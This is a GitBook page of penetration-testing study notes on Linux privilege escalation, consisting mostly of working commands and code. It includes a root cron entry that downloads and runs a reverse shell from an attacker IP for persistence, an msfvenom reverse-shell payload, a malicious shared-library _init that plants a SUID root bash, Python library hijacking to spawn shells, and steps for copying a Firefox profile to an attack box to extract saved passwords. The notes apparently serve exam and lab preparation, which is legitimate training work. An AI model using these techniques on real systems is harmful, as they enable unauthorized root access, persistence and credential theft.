# Linux

<div data-full-width="true"><figure><img src="../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure></div>

## Resources / Links

{% code overflow="wrap" fullWidth="true" %}
```
https://fareedfauzi.gitbook.io/oscp-playbook/linux-post-exploitation/linux-post-exploitation-command-list
https://d00mfist1.gitbooks.io/ctf/content/privilege_escalation_-_linux.html
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
https://book.hacktricks.xyz/linux-hardening/privilege-escalation
https://manuelvazquez-contact.gitbook.io/oscp-prep/privelege-escalation/linux-privilege-escalation
https://sirensecurity.io/blog/linux-privilege-escalation-resources/
https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation
https://book.hacktricks.xyz/linux-hardening/privilege-escalation
https://www.linuxkernelcves.com/cves
```
{% endcode %}

## General

{% code overflow="wrap" fullWidth="true" %}
```bash
https://github.com/rebootuser/LinEnum
https://github.com/The-Z-Labs/linux-exploit-suggester
https://github.com/diego-treitos/linux-smart-enumeration

id        id $ANOTHER_USER
cat /etc/passwd
hostname # might give hints about which type of server, name, etc.
cat /etc/issue
cat /etc/*-release
uname -a
ps -aux
ifconfig / ip a
route / routel / ip route
ss -nap / netstat -nap
ls -la /etc/iptables     cat /etc/iptables/*     grep -ri / iptables
ls -lah /etc/cron*
(sudo) crontab -l
cat /etc/crontab
The example above shows a similar situation where the antivirus.sh script was deleted, but the cron job still exists.
If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job.
dpkg -l            rpm -qa
find / -writable -type d 2>/dev/null
find / -iname 'config*' 2>/dev/null
cat /etc/fstab
mount
lsblk # in case unmounted partitions, we could mount them or search for sensitive files
lsmod # list drivers and kernel modules
modinfo $MODULE # get more info about any of the listed modules with lsmod
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Leaked creds/loot
env
history
cat $HOME/.bashrc
crunch 6 6 -t Pwd%%% > wordlist # in case we got a pwd and other users might have a similar one to bruteforce
sudo -l
sudo -i
sudo tcpdump -i lo -A | grep "pass"
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null

# Insecure file permissions
grep "CRON" /var/log/syslog
cat /var/log/cron.log

# Insecure System Components
ps -aux # grab PID
cat /proc/$PID/status
# SUID sets the effective UID of the running process to the executable owner's user ID (might be root)
/usr/sbin/getcap -r / 2>/dev/null
cat /var/log/syslog | grep $COMMAND # If there is an error on a command 
sudo aa-status # in case we can check AppArmor profiles
searchsploit "linux kernel ubuntu 10 local privilege escalation" # example to search for an exploit


- Check older file on home directory
- Check when target/box was created > check /etc/ssh/ssh_host_X as that date 
stat /etc/ssh/ssh_host_*
- find files between the following day of when box was created (that is when customization happened) till a week after
find /etc -type f -newermt 2022-06-04 ! -newermt 2022-06-14 -ls 2>/dev/null | less -S


# NFS
cat /etc/exports # the key is no_root_squash, if so and the share is writable, we can create and run a SUID to achieve privesc
showmount -e $TARGET_IP
mkdir tmp/mountonattackingmachine
sudo mount -o rw $TARGET_IP:/$NFS_SHARE /tmp/mountonattackingmachine
- On the target, copy /usr/bin/bash to the NFS share
# Following steps as root on the attacking machine
chown root:root bash
chmod 4755 bash 
# Then run that binary on the target 
./bash -p

ls -la /var/mail
who # who is logged
w # who is logged and what they are doing
last
ip a s
cat /etc/resolv.conf
# nestat needs sudo to show PID/program name
sudo netstat -plt
sudo netstat -atupn
# lsof List Open Files
sudo lsof -i
 sudo lsof -i :$PORT


# FIND FILES*****************************
# Look for .txt, .php, .db files (LinPEAS doesn't detect if no "pass" included)
find / -name *.txt -type f 2>/dev/null
find / -name *.php -type f 2>/dev/null
find / -name *.db -type f 2>/dev/null
find / -name *database* 2>/dev/null
# Search for interesting words within files
cat file | grep -i -E "user|pass|key|db|database" | less -S
# Check common locations
CHECK /home
CHECK /var/www
CHECK /opt/
# /opt is a directory for installing unbundled packages (i.e. packages not part of the Operating System distribution, but provided by an independent source), each one in its own subdirectory.
#CHECK OTHER USER'S FILES
find / -user $USER 2>/dev/null
#SEARCH FOR WRITABLE FILES
#Look for interesting files inside /var/www/html if there is a web server running.

# CHECK INTERNAL OPEN PORTS
ss -tulpn
lsof -i:9000 # --> know what's running on that port
# ATTENTION TO POSSIBLE WEBSERVER PORTS (CHECK ANY PORT 127.0.0.1:x)
# IF THE PORT IS HTTP ---> LOOK FOR INFO in /etc/apache2/sites-enabled

# su bruteforce TOOL
https://github.com/carlospolop/su-bruteforce

# List of available shells
cat /etc/shells

# FIND HOW A PROGRAM IS CALLED
# If the program is /home/oscp/ip (ip script)
grep -r "/home/oscp/ip" /etc/ #search in /etc/ because it's where services start

# NETWORKING INFO
ip a 
/sbin/route
ss -anp

# Enumerating Firewall Status and Rules
being no root, we can check /etc/iptables folder or grep the file system for iptables commands

# Installed Applications and Patch Levels
dpkg -l
rpm

# Readable/Writable Files and Directories
find / -writable -type d 2>/dev/null

# Unmounted disks
cat /etc/fstab
mount
/bin/lsblk

# Device Drivers and Kernel Modules
lsmod # we note the module name
/sbin/modinfo $MODULE
```
{% endcode %}

## Cron jobs / scripts

{% hint style="info" %}
If we see only our user's processes, cat /etc/fstab and probably pid is limited to show only ours.
{% endhint %}

{% code overflow="wrap" fullWidth="true" %}
```bash
https://linuxhandbook.com/crontab/
# pspy (spy on CRON jobs and processes)
https://github.com/DominicBreuker/pspy
# print both commands and file system events and scan procfs every 1000 ms (=1sec)
./pspy64 -pf -i 1000 

# if we cannot see other users' processes, check 
mount | grep proc # and we will probably see hidepid=invisible
# Hide processes
https://linux-audit.com/linux-system-hardening-adding-hidepid-to-proc/
mount -o remount,rw,hidepid=2 /proc


for user in $(cut -f 1 -d ':' /etc/passwd); do crontab -u $user -l; done

# Check ETA - remaining time
systemctl list-timers

crontab -l # for each user
cat /etc/crontab
grep "CRON" /var/log/cron.log
minute   hour   day date   month     day of the week(0 is Sunday)    user
*/5      *      *            *         *                            root

# WRITABLE FILES / CRON TASKS
# modify the script and write SUID privs to the shell
chmod 4755 /bin/sh 
# Then watch the behaviour until we have the setuid bit
watch -n 1 ls -l /bin/sh
# IF THE FILE CAN BE MODIFIED:
- Use that programming language to spawn a shell (GTFObins / reverse shell)
# IF THERE IS A TASK OR STH THAT EXECUTES THE FILE WITH HIGH PRIV:
- Try to rename the file and create one with the original name to spawn a shell

# Add a new cron job every minute to download and execute a revshell (persistence)
echo '* * * * * root /bin/bash -c "/usr/bin/wget $IP/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell"' > /$CRON_PATH

# SCRIPT TO DETECT CRON TASKS (SIMILAR TO PSPY)
#!/bin/bash
old_process=$(ps -eo command) #commands that are being executed right now
while true; do #infinite loop
	new_process=$(ps -eo command) #new variable with different processes due to the delay
	#Get the difference of processes (they start with < or >) except kworker
	diff <(echo "$old_process")  <(echo "$new_process") | grep "[\>\<]" | grep -v "kworker"
	old_process=$new_process
done
```
{% endcode %}

## Exploit Compilation

{% embed url="https://github.com/SecWiki/linux-kernel-exploits" %}

{% code overflow="wrap" fullWidth="true" %}
```bash
file /bin/bash
# if it says pie executable is ok, if not we have to specify --no-pie (maybe name is different) to specify no pie compilation when we compile scripts

# COMPILE 32-BIT BINARY ON KALI (WHEN GCC IS NOT AVAILABLE ON TARGET)
sudo apt-get install gcc-multilib
sudo apt-get install libc6-dev:i386
gcc -m32 -static exploit.c -o exploit
gcc -m32 -Wl,--hash-style=both 9542.c -o 9542

# Compile exploits for older Linux machines
https://github.com/X0RW3LL/XenSpawn

# C# compilation (mono)
If we need to convert from .NET to C# or viceversa, use AI such as Chat-GPT
"Convert the following VB.NET code into C# code and include functions inside static Main method as entry point"
Copy the output inside File.cs and hen
mcs File.cs
./File.exe

# DOTNET (COMPILE WINDOWS EXPLOITS)
https://learn.microsoft.com/en-us/dotnet/core/install/linux-debian
If that fails, get dotnet v7 on Docker (ask ChatGPT)

# LINUX EXPLOIT SUGGESTER
linux-exploit-suggester.sh
# Then take exploit file .c, upload it to the target machine and there:
gcc file.c -o exploit

# LOCAL EXPLOIT SUGGESTER (METASPLOIT)
run post/multi/recon/local_exploit_suggester
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
```
{% endcode %}

## Restricted shell

{% embed url="https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/" %}

{% content-ref url="../../exploitation/shells.md" %}
[shells.md](../../exploitation/shells.md)
{% endcontent-ref %}

## Create password hash

```bash
python -c 'import crypt; print crypt.crypt("hello","salted")'

# The command below works at least for /etc/shadow
mkpasswd -m sha-512 newpasswordhere
openssl passwd hola1234
# By default, if no other option is specified, openssl will generate a hash using the crypt algorithm by default.
openssl passwd -1 -salt [user] [password]
openssl passwd -1 -salt hacker 123456
$1$hacker$6luIRwdGpBvXdP.GMwcZp/
```

## Writable /etc/shadow

We can change the hash of a more privileged user for a known one and after we can leverage with su (user).

## Library Hijacking-Python

[https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)

Usually, Python takes libraries from the current directory. We can check this:

{% code overflow="wrap" %}
```bash
python
>> import sys
>> sys.path
# If we see [''] (empty value), it means it first searchs for libraries in the current path (the path where the Python script is located and where we need write privileges).

#If for example the library os.py is affected, we can create a file os.py in the same path as the Python script with this content:
import os
os.system('reverse shell')

#Another option is to search for that library, maybe we have write permissions to type the previous commands but at the end of that library file already existent.

# On the Python script folder where we have write permissions
$ cat datetime/__init__.py # in case there is import datetime on the vulnerable script, if not change the created folder name
import os
os.system("bash")

#Consider also to use PYTHONPATH environment variable if possible.
```
{% endcode %}

## **Dynamically Linked Shared Object Library**

#### **LD\_LIBRARY\_PATH, crontab**

{% embed url="https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library" %}

```bash
# ALTERNATIVE if we compile .c file into .so:

[kali@kali]$ cat suid.c 
#gcc -shared -fPIC -nostartfiles file.c -o file.so
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init() {

        setgid(0);
        setuid(0);
        system("cp /bin/bash /tmp/rootbash");
        system("chmod 4755 /tmp/rootbash");
}
```

## World-writable directories

/dev/shm, /tmp, /var/tmp

## **Internal Ports**

```bash
netstat # only interesting if it says 127.0.0.1 or any other IP rather than 0.0.0.0
```

## **Capabilities**

[**https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#the-special-case-of-empty-capabilities**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#the-special-case-of-empty-capabilities)

[**https://tbhaxor.com/exploiting-linux-capabilities-part-2/**](https://tbhaxor.com/exploiting-linux-capabilities-part-2/)

## **hijack sessions / shell sessions**

[**https://steflan-security.com/linux-privilege-escalation-exploiting-shell-sessions/**](https://steflan-security.com/linux-privilege-escalation-exploiting-shell-sessions/)

## **screen**

{% code overflow="wrap" %}
```bash
https://serverfault.com/questions/720357/ubuntu-allow-users-access-to-roots-screen-command-also-restrict-which-screens
# List screen shells for a specific username
screen -ls $USERNAME/
There is a suitable screen on:
...
# Detach previous running screen session and reattach here 
screen -dr $USERNAME/
screen -x root/ # $session_owner/
```
{% endcode %}

## **Services**

inspect closely every service, format is `/etc/systemd/system/X.service`

## **Startup tasks**

```bash
# init.d script
https://www.doyler.net/security-not-included/exploiting-init-d-fun-profit

ls -l /etc/rc*.d/
```

## **Firefox profiles / config files**

[**https://book.hacktricks.xyz/forensics/basic-forensic-methodology/specific-software-file-type-tricks/browser-artifacts#firefox**](https://book.hacktricks.xyz/forensics/basic-forensic-methodology/specific-software-file-type-tricks/browser-artifacts#firefox)

```bash
### METHOD 1 - cd .firefox or cd .mozilla, then to the profile folder
ls | grep -E "logins.json|cert9.db|cookies.sqlite|key4.db"
https://github.com/unode/firefox_decrypt
python firefox_decrypt.py
# then select a profile and do not provide a master password

#### METHOD 2 - Compress the folder
tar -cvf firefox.tgz .firefox
# Transfer it to our attack machine
scp firefox.tgz user@attackbox:
# Decompress it
tar xvf ~/firefox.tgz
# Launch Firefox with the profile and look for saved logins and passwords
firefox --profile .firefox/b5w4643p.default-release --allow-downgrade
```

## X11, .xauthority privesc

{% content-ref url="../../enumeration/ports/6000-x11.md" %}
[6000-x11.md](../../enumeration/ports/6000-x11.md)
{% endcontent-ref %}

## Using PAM EXEC to Log Passwords on Linux

```bash
https://youtu.be/FQGu9jarCWY

man PAM
# PAM is like an API to manage auth, session and password management
/etc/pam.d
man pam_shells
man pam_nologin
man pam_exec # pay attention to expose_authtoken

go mod init logger
touch main.go
code .
```

## exiftool privesc

[https://github.com/se162xg/CVE-2021-22204](https://github.com/se162xg/CVE-2021-22204)

## Generate .crash file

[https://resources.synergex.com/SiteKBArticle?id=100002487](https://resources.synergex.com/SiteKBArticle?id=100002487)

{% code overflow="wrap" fullWidth="true" %}
```
# EASY MANUAL WAY
echo 'ProblemType: test' > test.crash

You can test how a Linux (or Unix) system is handling crashes by using “kill -s 11” to simulate a segfault in a running program. For example:

$ sleep 20&

[1] 50272

$ kill -s 11 50272

[1]+ Segmentation fault     (core dumped) sleep 20
```
{% endcode %}

## Statically-linked Binaries

[https://github.com/andrew-d/static-binaries/tree/master](https://github.com/andrew-d/static-binaries/tree/master)

## Process Injection

[https://github.com/W3ndige/linux-process-injection](https://github.com/W3ndige/linux-process-injection)

## Running x86 code on ARM devices

[https://www.kali.org/docs/arm/x86-on-arm/](https://www.kali.org/docs/arm/x86-on-arm/)

## AD

[https://www.redhat.com/sysadmin/linux-active-directory](https://www.redhat.com/sysadmin/linux-active-directory)

## References

{% embed url="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" %}

{% embed url="https://github.com/TCM-Course-Resources/Linux-Privilege-Escalation-Resources" %}

{% embed url="https://github.com/diego-treitos/linux-smart-enumeration" %}

{% embed url="https://gtfobins.github.io/" %}
